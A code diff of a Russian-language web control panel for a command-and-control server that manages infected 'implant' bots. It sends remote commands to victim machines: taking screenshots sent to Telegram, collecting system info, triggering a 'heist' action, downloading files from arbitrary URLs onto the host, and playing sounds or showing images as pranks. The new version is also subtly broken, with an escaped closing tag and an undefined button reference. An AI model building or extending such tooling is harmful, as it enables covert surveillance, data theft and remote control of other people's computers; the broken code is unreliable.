@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Финальная, ревизированная версия) -->
+<!-- Файл: index.html (Финальная версия, совместимая с твоим сервером v2.0) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик (ФИНАЛ)</title>
+    <title>C2 Коммандный Мостик v2.0 (ФИНАЛ)</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -121,11 +121,6 @@
             background-color: var(--secondary-color);
             height: 5px;
             cursor: ns-resize;
-            transition: background-color 0.2s;
-        }
-        
-        #resizer:hover {
-            background-color: var(--accent-color);
         }
         
         .log-container {
@@ -148,29 +143,6 @@
             padding: 10px;
             background-color: var(--primary-color);
             cursor: pointer;
-        }
-        
-        .log-header h3 {
-            margin: 0;
-            padding: 0;
-            border: none;
-            font-size: 1em;
-        }
-        
-        .log-header-buttons {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .log-header-buttons button {
-            padding: 2px10px;
-            font-size: 1.2em;
-            line-height: 1;
-            font-weight: bold;
-            background-color: var(--secondary-color);
-            border: none;
-            cursor: pointer;
-            border-radius: 4px;
         }
         
         #log-list {
@@ -228,33 +200,10 @@
             background-color: #0056b3;
         }
         
-        .btn-action {
-            background-color: var(--action-color);
-        }
-        
-        .btn-danger {
-            background-color: var(--danger-color);
-        }
-        
         .grid-controls {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 15px;
-        }
-        
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            border: 1px solid var(--secondary-color);
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            box-sizing: border-box;
-        }
-        
-        input[type="range"] {
-            width: 100%;
         }
         
         .thumbnail-container {
@@ -263,39 +212,10 @@
             gap: 15px;
         }
         
-        .thumbnail-item {
-            position: relative;
-            text-align: center;
-            background-color: var(--secondary-color);
-            padding: 10px;
-            border-radius: 8px;
-        }
-        
-        .thumbnail-item img {
-            width: 100px;
-            height: 100px;
-            object-fit: cover;
-            border: 2px solid var(--bg-color);
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        
         .thumbnail-item p {
             margin: 8px 0 0 0;
             font-size: 0.8em;
             word-wrap: break-word;
-        }
-        
-        .volume-control-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        #volume-value {
-            font-weight: bold;
-            min-width: 40px;
-            text-align: right;
         }
         
         @media (max-width: 900px) {
@@ -330,7 +250,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик</h1></header>
+            <h1>Коммандный Мостик v2.0</h1></header>
         <main class="app-layout">
             <aside class="sidebar">
                 <h2>Боты в сети</h2>
@@ -343,24 +263,24 @@
                     <section>
                         <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
                         <div class="grid-controls">
-                            <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
-                            <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+                            <button onclick="sendCommand({action: 'screenshot'})">Скриншот (в ТГ)</button>
+                            <button onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
                             <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
                         </div>
                     </section>
                     <section>
                         <h2>Загрузка новых файлов</h2>
                         <input type="text" id="url-input" placeholder="URL...">
-                        <button class="btn-action" onclick="downloadFile()">Загрузить</button>
+                        <button onclick="downloadFile()">Загрузить</button>
                     </section>
                     <section>
                         <h2>Пранки и Медиа</h2>
                         <div class="grid-controls">
                             <div>
                                 <h3>Управление звуком</h3>
-                                <div class="volume-control-wrapper">
+                                <div>
                                     <input type="range" id="volume-slider" min="0" max="100"><span id="volume-value">50%</span></div>
-                                <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
+                                <button id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                             </div>
                             <div>
                                 <h3>Локальные звуки</h3>
@@ -379,267 +299,255 @@
         <div class="log-container">
             <div class="log-header" id="log-header">
                 <h3>Терминал</h3>
-                <div class="log-header-buttons">
+                <div>
                     <button id="clear-log-btn" title="Очистить консоль">🧹</button>
-                    <button id="toggle-log-btn" title="Свернуть/Развернуть">&times;</button>
-                </div>
+                    <button id="toggle-log-btn" title="Свернуть/Развернуть">&times;</button>&lt;/div></div>
+                <div id="log-list"></div>
             </div>
-            <div id="log-list"></div>
         </div>
-    </div>
-    <script>
-        const ui = {
-            botList: document.getElementById('bot-list'),
-            controlsWrapper: document.getElementById('controls-wrapper'),
-            selectedBotName: document.getElementById('selected-bot-name'),
-            logList: document.getElementById('log-list'),
-            audioFilesList: document.getElementById('audio-files-list'),
-            imageFilesList: document.getElementById('image-files-list'),
-            volumeSlider: document.getElementById('volume-slider'),
-            muteButton: document.getElementById('mute-btn'),
-            volumeValue: document.getElementById('volume-value'),
-            urlInput: document.getElementById('url-input'),
-            logContainer: document.querySelector('.log-container'),
-            logHeader: document.getElementById('log-header'),
-            clearLogBtn: document.getElementById('clear-log-btn'),
-            resizer: document.getElementById('resizer')
-        };
-        let socket, selectedBotId = null,
-            pingInterval = null,
-            watchdogTimer = null;
-        let reconnectDelay = 3000;
-        const maxReconnectDelay = 60000;
-
-        function log(message, type = 'info') {
-            const now = new Date();
-            const timestamp = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
-            const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
-            entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
-            ui.logList.appendChild(entry);
-            ui.logList.scrollTop = ui.logList.scrollHeight;
-        }
-
-        function connect() {
-            log("Подключение к C2...");
-            if (pingInterval) clearInterval(pingInterval);
-            if (watchdogTimer) clearTimeout(watchdogTimer);
-            if (socket && socket.readyState !== WebSocket.CLOSED) socket.close();
-            socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
-            socket.onopen = () => {
-                log("Соединение установлено.", "success");
-                reconnectDelay = 3000;
-                socket.send(JSON.stringify({
-                    type: 'operator'
-                }));
-                pingInterval = setInterval(() => {
-                    if (socket.readyState === WebSocket.OPEN) {
-                        socket.send('ping');
-                        watchdogTimer = setTimeout(() => {
-                            log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
-                            socket.close();
-                        }, 10000);
-                    }
-                }, 25000);
+        <script>
+            const ui = {
+                botList: document.getElementById('bot-list'),
+                controlsWrapper: document.getElementById('controls-wrapper'),
+                selectedBotName: document.getElementById('selected-bot-name'),
+                logList: document.getElementById('log-list'),
+                audioFilesList: document.getElementById('audio-files-list'),
+                imageFilesList: document.getElementById('image-files-list'),
+                volumeSlider: document.getElementById('volume-slider'),
+                muteButton: document.getElementById('mute-btn'),
+                volumeValue: document.getElementById('volume-value'),
+                urlInput: document.getElementById('url-input'),
+                logContainer: document.querySelector('.log-container'),
+                logHeader: document.getElementById('log-header'),
+                clearLogBtn: document.getElementById('clear-log-btn'),
+                resizer: document.getElementById('resizer')
             };
-            socket.onmessage = (event) => {
-                if (event.data === 'pong') {
-                    if (watchdogTimer) clearTimeout(watchdogTimer);
-                    return;
-                }
-                try {
-                    const msg = JSON.parse(event.data);
-                    switch (msg.type) {
-                        case 'bot_list':
-                            updateBotList(msg.data);
-                            break;
-                        case 'bot_details':
-                            if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
-                            break;
-                        case 'volume_update':
-                            if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
-                            break;
-                        case 'file_list_update':
-                            if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
-                            break;
-                        case 'status':
-                            log(`[${msg.bot_id || 'SERVER'}] ${msg.data}`);
-                            break;
-                    }
-                } catch (e) {
-                    log(`Ошибка обработки сообщения: ${e}`, 'error');
-                }
-            };
-            socket.onclose = () => {
-                log(`Соединение потеряно. Переподключение через ${reconnectDelay / 1000}с...`, "error");
+            let socket, selectedBotId = null,
+                pingInterval = null,
+                watchdogTimer = null;
+            let reconnectDelay = 3000;
+            const maxReconnectDelay = 60000;
+
+            function log(message, type = 'info') {
+                const now = new Date();
+                const timestamp = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+                const entry = document.createElement('div');
+                entry.className = `log-entry log-${type}`;
+                entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
+                ui.logList.appendChild(entry);
+                ui.logList.scrollTop = ui.logList.scrollHeight;
+            }
+
+            function connect() {
+                log("Подключение к C2...");
                 if (pingInterval) clearInterval(pingInterval);
                 if (watchdogTimer) clearTimeout(watchdogTimer);
-                selectBot(null);
-                setTimeout(connect, reconnectDelay);
-                reconnectDelay = Math.min(reconnectDelay * 2, maxReconnectDelay);
-            };
-        }
-
-        function updateBotList(bots) {
-            log(`Получен список ботов: [${bots.map(b => b.id).join(', ') || 'пусто'}]`);
-            const savedBotId = localStorage.getItem('lastSelectedBot');
-            const currentSelected = selectedBotId;
-            ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-            bots.forEach(bot => {
-                const btn = document.createElement('button');
-                btn.textContent = bot.id.replace('implant_', '');
-                btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(bot.id);
-                ui.botList.appendChild(btn);
-            });
-            if (currentSelected && bots.some(b => b.id === currentSelected)) {
-                selectBot(currentSelected, false);
-            } else if (savedBotId && bots.some(b => b.id === savedBotId)) {
-                selectBot(savedBotId, true);
-            } else {
-                selectBot(bots.length > 0 ? bots[0].id : null, true);
-            }
-        }
-
-        function selectBot(botId, requestDetails = true) {
-            selectedBotId = botId;
-            if (botId) localStorage.setItem('lastSelectedBot', botId);
-            else localStorage.removeItem('lastSelectedBot');
-            document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
-                btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
-            });
-            if (botId) {
-                ui.controlsWrapper.style.display = 'block';
-                ui.selectedBotName.textContent = botId.replace('implant_', '');
-                if (requestDetails) {
-                    log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
+                if (socket && socket.readyState !== WebSocket.CLOSED) socket.close();
+                socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+                socket.onopen = () => {
+                    log("Соединение установлено.", "success");
+                    reconnectDelay = 3000;
                     socket.send(JSON.stringify({
-                        type: 'get_details',
-                        target_id: botId
+                        type: 'operator'
                     }));
-                }
-            } else {
-                ui.controlsWrapper.style.display = 'none';
+                    pingInterval = setInterval(() => {
+                        if (socket.readyState === WebSocket.OPEN) {
+                            socket.send('ping');
+                            watchdogTimer = setTimeout(() => {
+                                log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
+                                socket.close();
+                            }, 10000);
+                        }
+                    }, 25000);
+                };
+                socket.onmessage = (event) => {
+                    if (event.data === 'pong') {
+                        if (watchdogTimer) clearTimeout(watchdogTimer);
+                        return;
+                    }
+                    try {
+                        const msg = JSON.parse(event.data);
+                        switch (msg.type) {
+                            case 'bot_list':
+                                updateBotList(msg.data);
+                                break;
+                            case 'bot_details':
+                                if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
+                                break;
+                            case 'status':
+                                log(`[${msg.bot_id || 'SERVER'}] ${msg.data}`);
+                                break;
+                        }
+                    } catch (e) {
+                        log(`Ошибка обработки сообщения: ${e}`, 'error');
+                    }
+                };
+                socket.onclose = () => {
+                    log(`Соединение потеряно. Переподключение через ${reconnectDelay / 1000}с...`, "error");
+                    if (pingInterval) clearInterval(pingInterval);
+                    if (watchdogTimer) clearTimeout(watchdogTimer);
+                    selectBot(null);
+                    setTimeout(connect, reconnectDelay);
+                    reconnectDelay = Math.min(reconnectDelay * 2, maxReconnectDelay);
+                };
             }
-        }
 
-        function handleBotDetails(data) {
-            log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
-            if (data.files) renderBotFiles(data.files);
-            if (data.volume_state) updateVolumeUI(data.volume_state);
-        }
-
-        function updateVolumeUI(state) {
-            log(`Синхронизация звука: Громкость ${state.level}%, Mute: ${state.is_muted}`, 'success');
-            ui.volumeSlider.value = state.level;
-            ui.volumeValue.textContent = `${state.level}%`;
-            ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
-            ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
-        }
-
-        function renderBotFiles(files) {
-            const audioContainer = ui.audioFilesList;
-            audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
-            if (files.audio) files.audio.forEach(file => {
-                const btn = document.createElement('button');
-                btn.textContent = file;
-                btn.className = 'btn-action';
-                btn.onclick = () => sendCommand({
-                    action: 'play',
-                    filename: file
+            function updateBotList(bots) {
+                log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
+                const currentSelected = selectedBotId;
+                ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
+                bots.forEach(botId => {
+                    const btn = document.createElement('button');
+                    btn.textContent = botId.replace('implant_', '');
+                    btn.className = 'btn-bot';
+                    btn.onclick = () => selectBot(botId);
+                    ui.botList.appendChild(btn);
                 });
-                audioContainer.appendChild(btn);
-            });
-            const imageContainer = ui.imageFilesList;
-            imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
-            if (files.image) files.image.forEach(imgData => {
-                const item = document.createElement('div');
-                item.className = 'thumbnail-item';
-                const imgElement = document.createElement('img');
-                imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : '';
-                imgElement.alt = imgData.filename;
-                imgElement.onclick = () => sendCommand({
-                    action: 'show',
-                    filename: imgData.filename
-                });
-                const nameElement = document.createElement('p');
-                let displayName = imgData.filename;
-                if (displayName.length > 40) {
-                    displayName = displayName.substring(0, 37) + '...';
+                if (currentSelected && bots.includes(currentSelected)) {
+                    selectBot(currentSelected, false);
+                } else {
+                    selectBot(bots.length > 0 ? bots[0] : null, true);
                 }
-                nameElement.textContent = displayName;
-                nameElement.title = imgData.filename;
-                item.appendChild(imgElement);
-                item.appendChild(nameElement);
-                imageContainer.appendChild(item);
-            });
-        }
+            }
 
-        function sendCommand(payload) {
-            if (!selectedBotId) return;
-            if (payload.action === 'heist' && !confirm(`Вы уверены?`)) return;
-            socket.send(JSON.stringify({
-                type: 'command',
-                target_id: selectedBotId,
-                payload
-            }));
-            log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
-        }
-        const debounce = (func, delay) => {
-            let timeout;
-            return (...args) => {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => func(...args), delay);
+            function selectBot(botId, requestDetails = true) {
+                selectedBotId = botId;
+                document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
+                    btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
+                });
+                if (botId) {
+                    ui.controlsWrapper.style.display = 'block';
+                    ui.selectedBotName.textContent = botId.replace('implant_', '');
+                    if (requestDetails) {
+                        log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
+                        socket.send(JSON.stringify({
+                            type: 'get_details',
+                            target_id: botId
+                        }));
+                    }
+                } else {
+                    ui.controlsWrapper.style.display = 'none';
+                }
+            }
+
+            function handleBotDetails(data) {
+                log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
+                if (data.files) renderBotFiles(data.files);
+                if (data.volume) updateVolumeUI(data.volume);
+            }
+
+            function updateVolumeUI(level) {
+                log(`Синхронизация звука: Громкость ${level}%`, 'success');
+                ui.volumeSlider.value = level;
+                ui.volumeValue.textContent = `${level}%`;
+            }
+
+            function renderBotFiles(files) {
+                const audioContainer = ui.audioFilesList;
+                audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
+                if (files.audio) files.audio.forEach(file => {
+                    const btn = document.createElement('button');
+                    btn.textContent = file;
+                    btn.className = 'btn-action';
+                    btn.onclick = () => sendCommand({
+                        action: 'play',
+                        filename: file
+                    });
+                    audioContainer.appendChild(btn);
+                });
+                const imageContainer = ui.imageFilesList;
+                imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
+                if (files.image) files.image.forEach(imgData => {
+                    const item = document.createElement('div');
+                    item.className = 'thumbnail-item';
+                    const imgElement = document.createElement('img');
+                    imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : '';
+                    imgElement.alt = imgData.filename;
+                    imgElement.onclick = () => sendCommand({
+                        action: 'show',
+                        filename: imgData.filename
+                    });
+                    const nameElement = document.createElement('p');
+                    let displayName = imgData.filename;
+                    if (displayName.length > 40) {
+                        displayName = displayName.substring(0, 37) + '...';
+                    }
+                    nameElement.textContent = displayName;
+                    nameElement.title = imgData.filename;
+                    item.appendChild(imgElement);
+                    item.appendChild(nameElement);
+                    imageContainer.appendChild(item);
+                });
+            }
+
+            function sendCommand(payload) {
+                if (!selectedBotId) return;
+                if (payload.action === 'heist' && !confirm(`Вы уверены?`)) return;
+                socket.send(JSON.stringify({
+                    type: 'command',
+                    target_id: selectedBotId,
+                    payload
+                }));
+                log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
+            }
+            const debounce = (func, delay) => {
+                let timeout;
+                return (...args) => {
+                    clearTimeout(timeout);
+                    timeout = setTimeout(() => func(...args), delay);
+                };
             };
-        };
-        const debouncedSendVolume = debounce(value => sendCommand({
-            action: 'volume',
-            level: value
-        }), 250);
-        ui.volumeSlider.addEventListener('input', (event) => {
-            const newLevel = event.target.value;
-            ui.volumeValue.textContent = `${newLevel}%`;
-            debouncedSendVolume(newLevel);
-        });
-
-        function downloadFile() {
-            const url = ui.urlInput.value.trim();
-            if (url) sendCommand({
-                action: 'download',
-                url
+            const debouncedSendVolume = debounce(value => sendCommand({
+                action: 'volume',
+                level: value
+            }), 250);
+            ui.volumeSlider.addEventListener('input', (event) => {
+                const newLevel = event.target.value;
+                ui.volumeValue.textContent = `${newLevel}%`;
+                debouncedSendVolume(newLevel);
             });
-        }
-        ui.logHeader.addEventListener('click', () => ui.logContainer.classList.toggle('collapsed'));
-        ui.clearLogBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            ui.logList.innerHTML = '';
-            log('Консоль очищена.');
-        });
-        let isResizing = false;
-        ui.resizer.addEventListener('mousedown', (e) => {
-            isResizing = true;
-            document.body.style.cursor = 'ns-resize';
-        });
-        document.addEventListener('mousemove', (e) => {
-            if (!isResizing) return;
-            const newHeight = window.innerHeight - e.clientY;
-            if (newHeight > 50 && newHeight < window.innerHeight * 0.8) {
-                ui.logContainer.style.height = `${newHeight}px`;
+
+            function downloadFile() {
+                const url = ui.urlInput.value.trim();
+                if (url) sendCommand({
+                    action: 'download',
+                    url
+                });
             }
-        });
-        document.addEventListener('mouseup', () => {
-            if (isResizing) {
-                isResizing = false;
-                document.body.style.cursor = 'default';
-                localStorage.setItem('logHeight', ui.logContainer.style.height);
-            }
-        });
-        document.addEventListener('DOMContentLoaded', () => {
-            const savedHeight = localStorage.getItem('logHeight');
-            if (savedHeight) ui.logContainer.style.height = savedHeight;
-            connect();
-        });
-    </script>
+            ui.logHeader.addEventListener('click', (e) => {
+                if (e.target.closest('button')) return;
+                ui.logContainer.classList.toggle('collapsed');
+            });
+            ui.clearLogBtn.addEventListener('click', () => {
+                ui.logList.innerHTML = '';
+                log('Консоль очищена.');
+            });
+            ui.toggleLogBtn.addEventListener('click', () => ui.logContainer.classList.toggle('collapsed'));
+            let isResizing = false;
+            ui.resizer.addEventListener('mousedown', (e) => {
+                isResizing = true;
+                document.body.style.cursor = 'ns-resize';
+            });
+            document.addEventListener('mousemove', (e) => {
+                if (!isResizing) return;
+                const newHeight = window.innerHeight - e.clientY;
+                if (newHeight > 50 && newHeight < window.innerHeight * 0.8) {
+                    ui.logContainer.style.height = `${newHeight}px`;
+                }
+            });
+            document.addEventListener('mouseup', () => {
+                if (isResizing) {
+                    isResizing = false;
+                    document.body.style.cursor = 'default';
+                    localStorage.setItem('logHeight', ui.logContainer.style.height);
+                }
+            });
+            document.addEventListener('DOMContentLoaded', () => {
+                const savedHeight = localStorage.getItem('logHeight');
+                if (savedHeight) ui.logContainer.style.height = savedHeight;
+                connect();
+            });
+        </script>
 </body>
 
 </html>
